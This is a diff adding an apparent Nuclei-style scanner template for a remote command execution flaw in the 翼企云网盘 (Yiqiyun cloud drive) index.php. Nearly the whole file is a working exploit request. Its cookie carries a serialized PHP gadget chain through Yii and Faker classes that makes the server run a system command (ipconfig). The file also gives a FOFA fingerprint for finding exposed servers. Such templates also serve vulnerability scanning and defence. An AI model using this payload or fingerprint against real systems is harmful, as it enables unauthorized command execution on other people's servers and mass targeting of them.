@@ -1,0 +1,27 @@
+id: poc-zawot5yyty7n50d6
+info:
+  name: 翼企云网盘 index存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zawot5yyty7n50d6'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zawot5yyty7n50d6
+    fofa: body="frontend/runtime.1975ec1eb449b67199b3.js"
+http:
+- raw:
+  - 'GET /index.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2164.41 Safari/537.36
+
+    Cookie: _SERVER_csrf_token=e2121f4d7b7aa2319744925ee6696385dbf1c0a3f38769b682c9f064c9702950O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A15%3A%22Faker%5CGenerator%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00formatters%22%3Ba%3A1%3A%7Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Bs%3A6%3A%22system%22%3Bs%3A2%3A%22id%22%3Bs%3A8%3A%22ipconfig%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7D
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
